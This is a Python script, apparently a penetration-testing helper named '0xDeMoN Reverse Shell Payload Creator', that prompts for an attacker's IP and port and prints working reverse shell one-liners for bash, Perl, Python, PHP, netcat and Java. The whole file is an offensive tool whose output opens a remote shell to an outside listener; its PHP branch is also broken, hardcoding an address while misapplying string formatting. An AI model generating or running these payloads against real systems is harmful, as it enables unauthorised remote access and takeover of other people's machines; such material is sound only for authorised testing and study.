#!/usr/bin/python
#0xDeMoN Reverse Shell Payload Creator
#leigh@myhackerhouse.com
import os, sys, time

print("""
***************************************************
*      0xDeMoN Reverse Shell Payload Creator      *
***************************************************
*  Select the type of payload you wish to create  *
***************************************************
*  1.) Bash Reverse Shell                         *
*  2.) Perl Reverse Shell                         *
*  3.) Python Reverse Shell                       *
*  4.) PHP Reverse Shell                          *
*  5.) Netcat Reverse Shell                       *
*  6.) Java Reverse Shell                         *
***************************************************
""")
def ncAlert():
    print("MAKE SURE YOU ARE LISTENING WITH NETCAT BEFORE EXECUTING THIS PAYLOAD!!!")

def bashReverse():
    ip = input('Please Enter Your IP : ')
    port = input('Please Enter Your Port : ')
    ncAlert()
    print("bash -i >& /dev/tcp/%s/%s 0>&1" % (ip, port))

def perlReverse():
    ip = input('Please Enter Your IP : ')
    port = input('Please Enter Your Port : ')
    ncAlert()
    print("""perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (ip, port))

def pythonReverse():
    ip = input('Please Enter Your IP : ')
    port = input('Please Enter Your Port : ')
    ncAlert()
    print("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (ip, port))

def phpReverse():
    ip = input('Please Enter Your IP : ')
    port = input('Please Enter Your Port : ')
    ncAlert()
    print("""php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'""" % (ip, port))

def netcatReverse():
    ip = input('Please Enter Your IP : ')
    port = input('Please Enter Your Port : ')
    ncAlert()
    print("""nc -e /bin/sh %s %s""" % (ip, port))

def javaReverse():
    ip = input('Please Enter Your IP : ')
    port = input('Please Enter Your Port : ')
    ncAlert()
    print("""
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
    """ % (ip, port))


PayloadSelect = input('Enter your choice [1-6] : ')
PayloadSelect = int(PayloadSelect)

if PayloadSelect == 1:
    bashReverse()
elif PayloadSelect == 2:
    perlReverse()
elif PayloadSelect == 3:
    pythonReverse()
elif PayloadSelect == 4:
    phpReverse()
elif PayloadSelect == 5:
    netcatReverse()
elif PayloadSelect == 6:
    javaReverse()
else:
    print("THAT IS NOT ALLOWED SIR!!!")
